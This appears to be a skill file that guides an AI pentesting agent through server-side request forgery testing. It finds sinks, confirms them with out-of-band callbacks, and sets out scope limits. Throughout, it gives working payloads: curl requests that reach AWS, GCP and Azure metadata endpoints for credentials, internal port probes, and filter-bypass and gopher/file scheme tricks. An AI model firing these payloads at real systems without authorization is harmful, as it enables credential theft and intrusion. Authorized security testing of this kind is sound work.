---
name: web-ssrf
description: Use when a param makes the server fetch a URL/host — find SSRF sinks, hit cloud metadata, confirm blind SSRF via OOB callbacks, bypass filters. Class ssrf.
---

# Server-side request forgery (SSRF)

The server fetches a URL you control (WSTG-INPV-19 · CWE-918 · OWASP A10:2021). Least-intrusive proof = an **out-of-band callback** or a differential response, never blindly reading internal secrets beyond what proves impact. Class `ssrf`. Keep target hosts in scope; internal ranges reached *through* an in-scope host are the whole point, but do not pivot to unauthorized external hosts.

Per candidate sink: `record kind=hypothesis ... class=ssrf outcome=testing`. **Test every param that could carry a URL/host/path against this class** — SSRF hides in fields that never look like URLs (see the sink list). A sink you can't disprove is `outcome=inconclusive`, surfaced by `recall gaps` — not dropped.

## 1. Find sinks (enumerate them all)
Any input the server will resolve or retrieve — check each one:
- Obvious URL params: `url=`, `uri=`, `link=`, `src=`, `dest=`, `redirect=`, `redirect_uri=`, `return=`, `next=`, `data=`, `path=`, `domain=`, `host=`, `port=`, `to=`, `out=`, `view=`, `page=`.
- Feature-driven fetchers: `image=`/avatar-by-URL, `callback=`/`webhook=`, `feed=`/RSS/`import=`-from-URL, `proxy=`, `file=`/remote include, link-preview/unfurl, PDF/screenshot/thumbnail/QR generators, favicon/OG-image fetchers, HTML-to-PDF (wkhtmltopdf/headless Chrome), document/office converters.
- Parser-driven (indirect): XML/SOAP/SVG external entities & DTDs (→ web-xxe), `<img>`/`url()`/`<iframe>` inside HTML the server renders, SSRF-in-Referer/`X-Forwarded-*` headers the backend re-requests.
- Non-URL-looking: hostnames/IPs in JSON bodies, `Host`-style config values, S3 bucket/region params, git/svn repo URLs, database/connection strings, webhook config in admin panels.

## 2. Confirm with an OOB callback (works even when blind)
```bash
# get a Collaborator/interactsh host, then point the param at it
curl -s "https://TARGET/fetch?url=http://OOB_ID.oast.pro/probe"
# a DNS+HTTP hit on your listener = confirmed SSRF (the SERVER resolved & fetched it)
```
Distinguish DNS-only (egress filtered, resolver reached) from a full HTTP hit. A callback from the target's egress IP is the cleanest proof. **DNS-only is still a lead**: the server resolved attacker-controlled DNS — record `outcome=inconclusive` (partial SSRF / egress-filtered) via `recall gaps`, do not refute.

## 3. Cloud metadata (high impact — read minimally) (WSTG-INPV-19 · CWE-918)
```bash
# AWS IMDSv1 (direct GET — reachable when the sink only does a plain GET):
curl -s "https://TARGET/fetch?url=http://169.254.169.254/latest/meta-data/iam/security-credentials/"

# AWS IMDSv2 (session tokens; needs a sink that controls METHOD + HEADERS, e.g. gopher:// or a full-request proxy):
#   PUT http://169.254.169.254/latest/api/token   header: X-aws-ec2-metadata-token-ttl-seconds: 21600
#   GET http://169.254.169.254/latest/meta-data/   header: X-aws-ec2-metadata-token: <token>
# many hosts now enforce IMDSv2 — a GET-only sink returns 401; note that as a partial result, not "no SSRF".

# GCP (header REQUIRED — try header-injectable sinks, gopher, or CRLF):
#   Metadata-Flavor: Google
#   http://metadata.google.internal/computeMetadata/v1/instance/service-accounts/default/token
#   .../computeMetadata/v1/  (169.254.169.254 also works)

# Azure (header Metadata:true REQUIRED):
#   http://169.254.169.254/metadata/instance?api-version=2021-02-01
#   http://169.254.169.254/metadata/identity/oauth2/token?api-version=2018-02-01&resource=https://management.azure.com/

# Alibaba: http://100.100.100.200/latest/meta-data/   |   DigitalOcean/OpenStack: http://169.254.169.254/
```
Retrieving IAM creds / an OAuth token = critical. Prove access to the credential endpoint; do **not** exfiltrate/use the keys further without engagement approval — `record kind=loot handle=cred:imds ...` and a `finding`.

## 4. Internal service scan (light)
- Point at `http://127.0.0.1:PORT/`, `http://169.254.169.254`, and common internal hosts (`localhost`, `[::1]`, container/orchestrator hostnames, `http://127.0.0.1:2375` Docker, `:6379` Redis, `:9200` Elastic, `:8500` Consul, `:2379` etcd, k8s API). Use response size / status / timing as an oracle for open vs closed ports. Keep it light — enumeration, not a port-flood.

## 5. Filter bypasses (when a naive allowlist/denylist blocks you — try each)
- Alternate encodings of 127.0.0.1: `2130706433` (decimal), `0x7f000001` (hex), `0177.0.0.1` (octal), `127.1`, `127.0.0.1.nip.io`, `[::1]`, `[::ffff:127.0.0.1]`, `0.0.0.0`, `①②⑦.0.0.1` (unicode).
- DNS rebinding / attacker domain resolving to an internal IP; `localtest.me`, `*.nip.io`, `*.sslip.io` wildcards that resolve to any IP you embed.
- Redirect chain: your server 302→`http://169.254.169.254/` (bypasses "must be https" / domain allowlist since the *redirect* target is what's fetched).
- URL-parser confusion: `http://allowed.com@169.254.169.254`, `http://169.254.169.254#allowed.com`, `http://169.254.169.254%2f@allowed.com`, `http://169.254.169.254%00.allowed.com`, embedded creds, backslashes.
- Schemes beyond http: `file://` (local read), `gopher://` (raw TCP → internal Redis/SMTP/HTTP with full control — the way to reach IMDSv2/POST endpoints), `dict://`, `ftp://`, `ldap://`, `sftp://` where the client supports them.

## Confirm vs false positive (calibrate, don't discard)
- A slow/errored request alone is not confirmed SSRF — but it's a lead: keep the hypothesis `inconclusive` and re-probe with OOB.
- Confirmed = an OOB hit, a metadata/internal body reflected, or a reproducible internal-vs-external differential. Client-side/DNS-only resolution without the server fetching → `inconclusive`, verify the fetch originates from the target before promoting to a finding.
- Never quit while `recall gaps` still lists an untested URL-ish param.

## Wire into the loop
```
record kind=hypothesis statement="url= param fetches attacker host" target=e7 class=ssrf approach="point at interactsh, watch DNS+HTTP" outcome=confirmed evidence=evidence/ssrf-oob.txt
record kind=finding title="SSRF in /fetch reaches AWS IMDS" severity=critical target=e7 class=ssrf cwe=CWE-918 status=confirmed hypothesisId=y8 repro="GET /fetch?url=http://169.254.169.254/latest/meta-data/iam/security-credentials/" evidence=["evidence/ssrf-imds.txt"]
```
Severity: metadata/creds or internal RCE reach = critical; internal port scan / arbitrary fetch = high; OOB-only with no reachable internal impact = medium.

## References
- OWASP WSTG — Testing for Server-Side Request Forgery — WSTG-INPV-19 — https://owasp.org/www-project-web-security-testing-guide/latest/4-Web_Application_Security_Testing/07-Input_Validation_Testing/19-Testing_for_Server-Side_Request_Forgery
- MITRE CWE-918: Server-Side Request Forgery (SSRF) — https://cwe.mitre.org/data/definitions/918.html
- OWASP Cheat Sheet — Server Side Request Forgery Prevention — https://cheatsheetseries.owasp.org/cheatsheets/Server_Side_Request_Forgery_Prevention_Cheat_Sheet.html
- PortSwigger Web Security Academy — SSRF — https://portswigger.net/web-security/ssrf
- AWS EC2 — How Instance Metadata Service Version 2 (IMDSv2) works — https://docs.aws.amazon.com/AWSEC2/latest/UserGuide/instance-metadata-v2-how-it-works.html
- Google Cloud — VM metadata overview (`Metadata-Flavor: Google`) — https://docs.cloud.google.com/compute/docs/metadata/overview
- Microsoft Azure — Instance Metadata Service (`Metadata:true`) — https://learn.microsoft.com/en-us/azure/virtual-machines/instance-metadata-service
